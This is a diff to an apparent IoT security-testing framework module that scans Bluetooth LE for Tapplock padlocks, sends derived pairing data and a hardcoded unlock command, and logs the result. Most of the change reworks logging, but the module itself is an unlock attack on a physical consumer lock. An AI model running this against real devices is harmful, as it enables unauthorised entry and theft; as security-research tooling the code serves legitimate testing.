@@ -1,14 +1,28 @@
 """Support for testing Tapplock device."""
 from hashlib import md5
 
-from expliot.core.tests.test import TCategory, TTarget, Test, TLog
+from expliot.core.tests.test import TCategory, TTarget, Test, \
+    TLog, LOGPRETTY
 from expliot.core.protocols.radio.ble import Ble, BlePeripheral, \
     ADDR_TYPE_RANDOM
 
 
 # pylint: disable=bare-except
 class TappUnlock(Test):
-    """Test for Tapplock device."""
+    """
+    Unlock Tapplock device.
+
+    output Format:
+    [
+        {
+            "name": "Foobar",
+            "addr": "de:ad:be:ef:01:01",
+            "sent_pair_data": "55aab4010800abedcc01",
+            "sent_unlock_cmd": "55aa810200008201"
+        },
+        # ... May be more than one Tapplock device
+    ]
+    """
 
     TNAMEPREFIX = "TL104A"
     # PAIRPREXIX  = "55AAB4010800"
@@ -84,19 +98,21 @@ class TappUnlock(Test):
                 for device in devices:
                     name = device.getValueText(Ble.ADTYPE_NAME)
                     if name is not None and name[0:6] == self.TNAMEPREFIX:
-                        TLog.success(
-                            "Found Tapplock (name={})(mac={})".format(name, device.addr)
-                        )
-                        self.unlock(device.addr)
+                        TLog.success("Found Tapplock")
+                        self.unlock(device.addr, name=name)
         except:  # noqa: E722
             self.result.exception()
 
-    def unlock(self, mac):
+    def unlock(self, mac, name=None):
         """
         Unlock the specified Tapplock.
 
-        :param mac: The BLE address of the Tapplock
-        :return:
+        Args:
+            mac(str): The BLE address of the Tapplock
+            name(str): The name of the Tapplock as advertised over BLE
+
+        Returns:
+            Nothing
         """
         device = BlePeripheral()
         try:
@@ -129,9 +145,13 @@ class TappUnlock(Test):
             # Create the pairing data
             pairing_data = pairing_data + checksum_string[2:4] + checksum_string[0:2]
             device.connect(mac, addrType=ADDR_TYPE_RANDOM)
-            TLog.trydo("Sending pair data({})".format(pairing_data))
             device.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(pairing_data))
-            TLog.trydo("Sending unlock command({})".format(self.UNLOCKCMD))
             device.writeCharacteristic(self.UNLOCKHNDL, bytes.fromhex(self.UNLOCKCMD))
+            self.output_handler(tlogtype=TLog.TRYDO,
+                                logkwargs=LOGPRETTY,
+                                name=name,
+                                addr=device.addr,
+                                sent_pair_data=pairing_data,
+                                sent_unlock_cmd=self.UNLOCKCMD)
         finally:
             device.disconnect()
